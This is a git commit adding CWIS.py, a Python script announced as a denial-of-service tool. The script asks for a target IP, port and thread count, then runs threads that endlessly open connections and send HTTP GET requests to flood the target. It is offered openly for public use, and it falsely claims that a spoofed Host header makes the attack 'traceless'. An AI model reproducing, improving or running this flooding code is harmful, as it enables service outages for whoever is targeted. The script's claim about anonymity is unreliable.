5f37c817ac76cc521c9b8c56ce09115f4b5d3b16
chilloxop <71260756+chilloxop@users.noreply.github.com>
2020-10-01 21:01:22 +0930

    CWIS DoS tool -----  V1.2.5
    First public release for CWIS

---
+++ CWIS.py
@@ -0,0 +1,108 @@
+import socket
+import threading
+import time
+import random
+import struct
+import sys
+import os
+
+
+class color:  #########fix this color class (might not even be my fault maybe some gay terminal stuff)
+    pass
+
+
+print("""\n
+██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
+█                                                                                                                                                                        █
+█                    ██████╗██╗    ██╗██╗███████╗                                                                                                                        █
+█                   ██╔════╝██║    ██║██║██╔════╝                                                                                                                        █
+█                   ██║     ██║ █╗ ██║██║███████╗                                                                                                                        █
+█                   ██║     ██║███╗██║██║╚════██║                                                                                                                        █
+█                   ╚██████╗╚███╔███╔╝██║███████║                                                                                                                        █
+█                    ╚═════╝ ╚══╝╚══╝ ╚═╝╚══════╝                                                                                                                        █
+██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████    
+    """)
+
+
+rep_oc = 0  # just means repeated stuff and prints numbers out. weird variable names huh?
+print('\nVersion 1.2.5   --------------    By JonesBBQ at the K!CK M3 Team      ')
+time.sleep(3)
+target = input('\nEnter target IP address : ')
+port = int(input('\nEnter port of target : '))
+ip_mask = input('\nEnter IP mask    ||makes your attack traceless||   : ')  # not fully anonymous note: make it better
+num_thread = int(input('\nEnter number of threads          ||25 is decent depending on pc power||              : '))
+time.sleep(1)
+print('\nIt will print a number depending on your thread options')
+ip_mask_sec1 = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+ip_mask_sec2 = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+
+def main_attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, int(port)))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + ip_mask + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+        global rep_oc
+
+        rep_oc += 1  # look at line 10
+        if rep_oc % 500 == 0:     #every 500 hits it prints it
+            print(rep_oc)
+
+
+for i in range(num_thread):
+    thread = threading.Thread(target=main_attack)
+    thread.start()
+
+
+
+
+def sec_attack1():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, int(port)))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + ip_mask_sec1 + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+        global rep_oc
+
+        rep_oc += 1  # look at line 10
+        if rep_oc % 500 == 0:     #every 500 hits it prints it
+            print(rep_oc)
+
+
+def sec_attack2():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, int(port)))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + ip_mask_sec2 + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+        global rep_oc
+
+        rep_oc += 1  # look at line 10
+        if rep_oc % 500 == 0:     #every 500 hits it prints it
+            print(rep_oc)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
